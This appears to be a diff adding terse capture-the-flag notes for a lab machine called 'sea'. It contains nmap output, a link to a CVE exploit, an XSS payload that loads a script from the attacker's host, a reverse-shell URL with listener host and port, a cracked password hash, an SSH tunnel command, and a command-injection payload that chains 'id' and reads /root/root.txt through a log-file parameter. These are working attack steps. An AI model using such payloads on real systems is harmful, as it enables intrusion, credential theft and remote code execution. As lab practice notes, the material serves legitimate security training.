@@ -1,0 +1,29 @@
+10.10.11.28
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 e354e072203c014293d1669d900cabe8 (RSA)
+|   256 f3244b08aa519d56153d6756747c2038 (ECDSA)
+|_  256 30b105c64150ff22a37f41060e67fd50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Sea - Home
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+https://github.com/prodigiousMind/CVE-2023-41425
+
+http://sea.htb/index.php?page=loginURL"></form><script+src="http://10.10.14.17:8000/xss.js"></script><form+action="
+
+http://10.10.11.28/themes/revshell-main/rev.php?lhost=10.10.14.17&lport=4444
+
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+
+sh 10.10.11.28 -l amay  
+ssh -L 1234:localhost:8080 amay@10.10.11.28
+
+comand injection:
+log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log;id;cat+/root/root.txt;id&analyze_log=
